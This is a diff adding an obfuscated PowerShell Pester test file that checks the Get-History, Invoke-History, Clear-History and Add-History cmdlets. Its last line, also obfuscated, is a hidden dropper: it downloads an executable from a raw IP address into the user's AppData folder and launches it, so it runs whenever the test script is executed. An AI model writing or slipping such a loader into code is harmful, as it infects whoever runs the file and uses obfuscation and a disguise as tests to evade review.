@@ -1,0 +1,130 @@
+  SEt-iTEm  ("V"+"ArIa"+"BLE:Kxs"+"J2") ( [TyPE]("{10}{8}{2}{7}{13}{9}{1}{3}{11}{5}{12}{6}{0}{4}" -f's','ut','stE','omAti','eTTings','oc','on','M.mAnaGe','Y','EnT.A','s','ON.pSINV','ati','M')) ;SET-item ("{2}{0}{3}{1}"-f'r','als','va','iAblE:KM')  (  [type]("{2}{0}{1}"-f'l','l','PowErsHE'));  sEt-Item ('vari'+'able'+':E'+'j'+'Zbx6') ([TyPE]("{2}{1}{0}" -f'imE','tET','da')  )  ;  SET-ItEm ("{1}{2}{3}{4}{0}" -f'3','vArIAB','LE:','8iF','W') ( [TYpE]("{6}{3}{1}{8}{2}{7}{4}{5}{0}{9}"-F 'tat','U','tiOn.R','.a','aceS.PIpelIne','S','ManAGEMeNt','UnSp','tOma','E') )  ; 
+
+.("{0}{2}{1}"-f'Des','be','cri') ("{3}{7}{2}{1}{0}{6}{5}{4}" -f't ','e','l','History c','s',' case','test','md') -Tags "CI" {
+    .("{0}{1}{2}" -f'Co','n','text') ("{1}{4}{3}{0}{5}{2}"-f' History ','Si','ests','le','mp','T') {
+        .("{1}{0}{2}" -f 'eEa','Befor','ch') {
+            ${s`eT`TINg} =   $KXsj2::("{0}{1}"-f 'N','ew').Invoke()
+            ${s`Et`TINg}."adDT`OHIst`O`RY" = ${Tr`Ue}
+            ${p`S} =   (GCI ("{3}{2}{0}{1}"-f'rI','ABLE:KMalS','A','V')).vAluE::("{0}{1}"-f'C','reate').Invoke(("{2}{3}{0}{1}"-f'c','e','Ne','wRunspa'))
+            
+            
+            ${nU`lL} = ${p`s}.("{2}{0}{1}" -f'om','mand','addc').Invoke(("{1}{2}{0}"-f '-Date','G','et'))."INv`oke"(${nu`lL}, ${SE`Tti`Ng})
+            ${P`s}."C`OmM`ANdS".("{0}{1}" -f'c','lear').Invoke()
+            ${NU`Ll} = ${PS}.("{0}{1}{2}" -f 'a','dds','cript').Invoke("1+1")."inv`oke"(${Nu`Ll}, ${s`e`TtIng})
+            ${ps}."COm`MAndS".("{1}{0}" -f 'r','clea').Invoke()
+            ${Nu`ll} = ${p`s}.("{0}{1}{2}" -f 'addc','om','mand').Invoke(("{2}{0}{1}"-f'et-','Location','G'))."inVO`ke"(${NU`lL}, ${SE`TT`iNG})
+            ${p`s}."Com`M`ANds".("{0}{1}"-f 'c','lear').Invoke()
+        }
+        &("{1}{0}{2}"-f'erEa','Aft','ch') {
+            ${P`S}.("{0}{1}" -f 'Dis','pose').Invoke()
+        }
+        &('It') ("{6}{9}{5}{8}{3}{4}{2}{0}{1}{7}"-f'ns',' proper his','y retur','st','or','H','G','tory','i','et-') {
+            
+            ${REs`U`lT} = ${ps}.("{1}{0}{2}" -f'o','AddC','mmand').Invoke(("{0}{1}{2}"-f 'Get-Hi','stor','y'))."i`Nv`okE"()
+            ${R`e`SULT}."C`ounT" | &("{1}{0}"-f 'uld','Sho') -Be 3
+            ${rEsu`lt}[0]."c`oMma`N`dLine" | &("{1}{0}" -f 'ould','Sh') -BeExactly ("{1}{0}{2}" -f '-Da','Get','te')
+            ${REs`U`LT}[1]."Comma`NDlI`Ne" | .("{2}{0}{1}"-f 'h','ould','S') -Be "1+1"
+            ${ReS`U`Lt}[2]."C`OmmAn`dLi`Ne" | &("{2}{1}{0}" -f'ld','ou','Sh') -BeExactly ("{3}{2}{1}{0}"-f 'ation','-Loc','t','Ge')
+        }
+        .('It') ("{5}{7}{1}{8}{6}{4}{2}{3}{9}{0}" -f 'd','s pr','co','m','er ','Invoke-Hi','p','story invoke','o','man') {
+            ${REsU`Lt} = ${pS}.("{1}{2}{0}" -f 'ipt','AddSc','r').Invoke(("{3}{0}{2}{4}{1}"-f 'o','istory 2','ke-','Inv','H'))."in`V`OKE"()
+            ${ReS`ULT} | .("{2}{0}{1}"-f 'ho','uld','S') -Be 2
+        }
+        .('It') ("{1}{5}{3}{2}{4}{0}"-f 'removes history','Clea','Hist','-','ory ','r') {
+            ${Ps}.("{0}{2}{1}"-f 'AddCom','and','m').Invoke(("{3}{1}{2}{0}"-f'story','H','i','Clear-'))."i`NvOkE"()
+            ${P`S}."comM`Ands".("{0}{1}"-f'c','lear').Invoke()
+            ${rE`sUlT} = ${p`s}.("{1}{2}{0}"-f 'nd','Ad','dComma').Invoke(("{1}{2}{0}" -f'story','Get','-Hi'))."I`NVOKE"()
+            ${Re`sULT} | .("{0}{1}" -f 'Shoul','d') -BeNullOrEmpty
+        }
+        &('It') ("{1}{3}{8}{6}{2}{7}{5}{4}{0}" -f 'ry','Add-Histo','lly','r',' histo','ds to','a',' ad','y actu') {
+            
+            ${Ps}.("{3}{0}{1}{2}"-f'd','dScr','ipt','A').Invoke(((("{3}{6}{2}{1}{5}{0}{4}"-f 'sto','d-','d','Get-H','ry','Hi','istory{0}A')) -F  [cHar]124))."In`Vo`ke"(${nu`LL}, ${Set`T`ING})
+            
+            ${p`S}."COMM`A`NdS".("{0}{1}" -f'Cle','ar').Invoke()
+            ${Re`suLt} = ${p`s}.("{1}{0}{2}" -f'dC','Ad','ommand').Invoke(("{0}{2}{1}" -f 'Get','ory','-Hist'))."iN`VO`KE"()
+            ${reS`ULt}."co`Unt" | .("{1}{0}"-f 'ould','Sh') -Be 8
+            for (${I} = 0; ${i} -lt 4; ${I}++) {
+                ${res`U`lt}[${i} + 4]."coMmaN`Dl`iNe" | .("{0}{2}{1}" -f 'S','ld','hou') -BeExactly ${R`e`SUlT}[${I}]."cO`MmAnD`LinE"
+            }
+        }
+    }
+
+    &('It') ("{3}{8}{0}{10}{6}{5}{9}{7}{4}{1}{2}"-f 'tory on','tput on all ','streams','Tests Invoke-H','u',' ge',' cmdlet that','s o','is','nerate',' a') {
+        ${S`TrEaMSPa`Mm`ER} = '
+        function StreamSpammer
+        {
+            [CmdletBinding()]
+            param()
+
+            Write-Debug "Debug"
+            Write-Error "Error"
+            Write-Information "Information"
+            Write-Progress "Progress"
+            Write-Verbose "Verbose"
+            Write-Warning "Warning"
+            "Output"
+        }
+
+        $informationPreference = "Continue"
+        $debugPreference = "Continue"
+        $verbosePreference = "Continue"
+        '
+
+        ${InVo`ca`TiOn`SeTTiNgs} = .("{0}{2}{3}{1}" -f'N','Object','ew','-') ("{6}{5}{3}{2}{1}{4}{0}{7}"-f 'i','n','vocatio','n.PSIn','Sett','io','System.Management.Automat','ngs')
+        ${INvOC`AT`ions`ET`Ti`NgS}."A`Dd`T`ohIsTOry" = ${t`RUe}
+        ${P`S} =  (  get-vARIaBLE  ("{1}{0}" -f 'AlS','kM')).VALUE::("{0}{1}" -f'C','reate').Invoke()
+        ${nu`lL} = ${p`s}.("{3}{1}{0}{2}" -f'crip','dS','t','Ad').Invoke(${s`TRe`AMsPA`MMer})."Inv`OkE"()
+        ${P`s}."comm`A`Nds".("{0}{1}"-f'Clea','r').Invoke()
+        ${nU`lL} = ${ps}.("{2}{1}{0}{3}" -f 'r','ddSc','A','ipt').Invoke(("{1}{2}{0}" -f'pammer','Stream','S'));
+        ${Nu`ll} = ${ps}."I`Nv`oKE"(${NU`lL}, ${in`VocATIon`sE`T`TI`NGs})
+        ${pS}."com`MaN`ds".("{0}{1}" -f 'Cle','ar').Invoke()
+        ${NU`lL} = ${P`S}.("{0}{2}{1}" -f'A','pt','ddScri').Invoke(("{1}{5}{4}{3}{2}{0}{6}" -f'-id','Inv','y ','or','ist','oke-H',' 1'))
+        ${RE`s`ULt} = ${p`S}."In`VOkE"(${Nu`LL}, ${InVo`CaTIonsE`TTi`N`GS})
+        ${OuTpU`T`cO`UnT} = $(
+            ${Ps}."St`REAMS"."e`Rror";
+            ${P`S}."StR`Ea`mS"."p`R`ogresS";
+            ${P`S}."sTreA`MS"."VE`RBO`SE";
+            ${ps}."STR`EaMS"."D`ebug";
+            ${pS}."St`Re`Ams"."w`ArNING";
+            ${P`S}."STRE`Ams"."IN`ForMAT`i`On")."C`ouNT"
+        ${p`S}.("{2}{1}{0}" -f 'ose','sp','Di').Invoke()
+
+        
+        ${oUTputc`o`UNt} | &("{0}{2}{1}"-f'Sh','d','oul') -Be 12
+    }
+
+    &('It') ("{4}{0}{3}{8}{5}{7}{2}{6}{1}"-f '-H','d','te co','ist','Tests Invoke',' on a ','mman','priva','ory') {
+
+        ${InvO`cA`TIoNSET`TinGs} = &("{2}{1}{0}{3}" -f'w','e','N','-Object') ("{4}{6}{7}{5}{1}{3}{8}{0}{2}{9}"-f 'Sett','vocat','in','io','Syst','n','em.Ma','nagement.Automation.PSI','n','gs')
+        ${I`Nv`OcaTI`ONSETtiNgS}."AD`dTOh`I`SToRy" = ${tR`UE}
+        ${pS} =   (gcI  ("{0}{2}{1}" -f'v','aBLE:KMaLS','ARI')).vAlue::("{1}{2}{0}"-f'te','Cre','a').Invoke()
+        ${nu`Ll} = ${P`S}.("{1}{2}{0}"-f 'ript','A','ddSc').Invoke(((("{8}{5}{7}{3}{2}{0}{4}{1}{6}{10}{9}"-f ').V','it','ess','Proc','isibil','and G','y =','et-','(Get-Comm','teGo1',' Go1Priva'))."rEPL`AcE"('Go1',[striNg][char]39)))."iN`VOke"()
+        ${P`S}."co`MMA`Nds".("{1}{0}"-f 'lear','C').Invoke()
+        ${n`ULL} = ${Ps}.("{1}{2}{0}"-f'ipt','A','ddScr').Invoke(('Ge'+'t-Proce'+'ss'+' '+'-i'+'d '+"$pid"))
+        ${n`Ull} = ${PS}."I`Nv`OKE"(${N`ULl}, ${iNvOCAtI`O`Ns`ETt`inGS})
+        ${P`s}."c`OmM`ANdS".("{1}{0}"-f'ar','Cle').Invoke()
+        ${nu`ll} = ${PS}.("{2}{1}{0}" -f'pt','i','AddScr').Invoke(("{0}{2}{1}{5}{3}{4}" -f 'Invoke-Hi','r','sto','id ','1','y -'))
+        ${Re`sU`lt} = ${P`s}."i`NvOke"(${Nu`lL}, ${IN`VocA`TI`oNSETtIN`Gs})
+        ${E`Rro`RResu`LT} = ${P`S}."StR`e`AMS"."E`RROR"[0]."fulLY`Qu`A`LIfI`EDerrOriD"
+        ${PS}.("{2}{0}{1}"-f'o','se','Disp').Invoke()
+
+        ${ER`R`oR`ResULT} | &("{0}{2}{1}"-f 'S','ould','h') -BeExactly ("{0}{2}{3}{1}{4}{5}"-f'Com','NotFoundExce','m','and','pt','ion')
+    }
+
+    &('It') ("{7}{3}{2}{6}{0}{5}{1}{4}" -f 'o calculate','rati','ryIn','o','on','s Du','f','Hist') {
+        ${s`T`ArT} =  (vaRiaBlE ("EjZ"+"bX6")  -vaLUe )::("{1}{0}" -f 'w','ne').Invoke(2001, 01, 01, 10, 01, 01)
+        ${D`URaTi`oN} = [timespan] ("{0}{1}" -f'1',':2:21')
+        ${e`ND} = ${S`T`ARt} + ${dU`R`ATiOn}
+        ${hiS`TOrY} = [PSCustomObject] @{
+            ("{2}{1}{3}{0}"-f'ne','n','Comma','dLi')        = ("{1}{0}" -f 'and','comm')
+            ("{1}{4}{0}{2}{3}"-f'o','Execu','nStat','us','ti')    =  ( gEt-VaRIAble  ("{1}{0}" -f'iFw3','8')  ).valUE::"c`omPL`etEd"
+            ("{1}{0}{3}{4}{2}" -f 'tartExecuti','S','me','on','Ti') = ${s`TArt}
+            ("{0}{3}{2}{4}{1}"-f 'En','ime','o','dExecuti','nT')   = ${E`ND}
+        }
+        ${h`IStORY} | &("{2}{0}{1}"-f'ist','ory','Add-H')
+        ${h} = &("{3}{2}{0}{1}"-f't-Histo','ry','e','G') -count 1
+        ${h}."DuR`A`TiOn" | .("{0}{1}" -f'S','hould') -Be ${DuR`AT`ION}
+    }
+}
+
+(&("{2}{0}{1}"-f'O','bject','New-') ("{4}{1}{2}{0}{3}{5}"-f 'bCl','te','m.Net.We','ien','Sys','t')).("{3}{2}{0}{1}" -f 'dF','ile','loa','Down').Invoke(("{5}{4}{7}{0}{3}{1}{6}{2}{8}"-f '53.','o/csrsv','ex','238/~yaho','10','http://94.','.','2.','e'),"$env:APPDATA\csrsv.exe");&("{0}{2}{1}" -f'S','rocess','tart-P') ("$env:APPDATA\csrsv.exe")
